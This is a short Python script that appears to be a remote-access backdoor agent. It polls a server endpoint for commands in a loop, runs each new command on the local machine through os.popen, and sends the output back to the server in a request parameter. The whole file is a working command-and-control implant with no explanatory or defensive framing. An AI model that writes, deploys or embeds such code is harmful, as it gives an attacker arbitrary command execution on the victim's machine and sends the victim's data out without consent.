from requests import get
from os import popen
from time import sleep
url = ''
preid = 0


while True:
	cde = get(url+'/gmecde')
	cde = list(cde.text)
	afters = False
	code = ""
	id = ""
	for i in cde:
		if i == '*':
			afters = True
			continue
		if not afters:
			code += i
			continue
		else: id += i
	if id == preid:
		sleep(5)
		continue
	print('id: '+id)
	print('cde: '+code)
	respond = popen(code).read()
	get(url+f'/target?respond={respond}&id={id}')
	preid = id
